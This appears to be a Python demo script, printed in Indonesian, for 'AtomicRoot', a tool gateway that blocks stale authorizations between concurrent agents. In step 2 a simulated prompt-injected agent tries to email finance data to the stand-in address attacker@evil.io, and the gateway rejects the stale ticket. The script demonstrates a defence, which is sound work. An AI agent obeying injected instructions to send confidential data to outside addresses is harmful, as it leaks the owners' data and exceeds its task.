import logging
from atomicroot.store.trace_store import TraceStore
from atomicroot.authority.authority import PolicyAuthority, TaskContextStore
from atomicroot.authority.ticket import generate_keypair
from atomicroot.gateway.gateway import ToolGateway, ToolEffectLog
from atomicroot.sim.worker import SimulatedWorker

def run_demo():
    print("="*70)
    print("DEMO: AtomicRoot Mencegah Stale Authorization (Data Exfiltration)")
    print("="*70)

    # Inisialisasi Sistem
    store = TraceStore(":memory:")
    sk, vk = generate_keypair()
    task_ctx = TaskContextStore()
    authority = PolicyAuthority(store, task_ctx, signing_key=sk)
    effect_log = ToolEffectLog()
    gateway = ToolGateway(store, vk, effect_log)

    task_id = "t-9f21"
    task_ctx.register_task(task_id, {"data_classes_readable": ["internal", "finance"]})
    task_ctx.register_document("fin-report-2026", "finance")

    worker_a = SimulatedWorker("Agent-A", authority, gateway)
    worker_b = SimulatedWorker("Agent-B", authority, gateway)

    taint_key = f"taint:{task_id}"

    print(f"\n[Status Awal] Versi '{taint_key}' di database: {store.get_version(taint_key)}")

    print("\n[STEP 1] Agent A meminta izin membaca dokumen rahasia (finance)...")
    ticket_a = worker_a.request_authorization(task_id, "read_document", {"doc_id": "fin-report-2026", "data_class": "finance"})
    print(f"  -> Diizinkan! Tiket A diterbitkan.")
    print(f"  -> Tiket A mengunci (footprint) versi: {ticket_a['footprint']}")

    print("\n[STEP 2] Agent B (terinjeksi) secara bersamaan meminta izin mengirim email...")
    ticket_b = worker_b.request_authorization(task_id, "send_email", {"to": "attacker@evil.io", "body_ref": "mem:blob-77"})
    print(f"  -> Diizinkan! (Karena dokumen rahasia belum benar-benar dibaca).")
    print(f"  -> Tiket B mengunci (footprint) versi: {ticket_b['footprint']}")

    print("\n[STEP 3] Agent A mengeksekusi (commit) tindakannya di Gateway...")
    res_a = worker_a.execute(ticket_a, {"doc_id": "fin-report-2026", "data_class": "finance"})
    print(f"  -> Status Eksekusi A: {res_a['status']}")
    print(f"  -> Gateway menaikkan versi '{taint_key}' menjadi: {res_a['version_after'][taint_key]}")

    print("\n[STEP 4] Agent B mencoba mengeksekusi pengiriman email dengan tiketnya...")
    res_b = worker_b.execute(ticket_b, {"to": "attacker@evil.io", "body_ref": "mem:blob-77"})
    print(f"  -> Status Eksekusi B: {res_b['status']} !!")
    if res_b['status'] == 'STALE_TICKET':
        print(f"  -> Alasan: Kunci yang basi adalah {res_b['stale_keys']}.")
        print(f"  -> Gateway menolak karena tiket B berharap versi {res_b['expected'][taint_key]}, "
              f"tapi versi aktual di database sudah {res_b['actual'][taint_key]} (akibat aksi Agent A).")

    print("\n" + "="*70)
    print(f"HASIL AKHIR: Apakah email bocor terkirim? {'Ya (Gagal)' if effect_log.was_executed(ticket_b['ticket_id']) else 'TIDAK (AtomicRoot Berhasil)'}")
    print("="*70)

if __name__ == '__main__':
    run_demo()
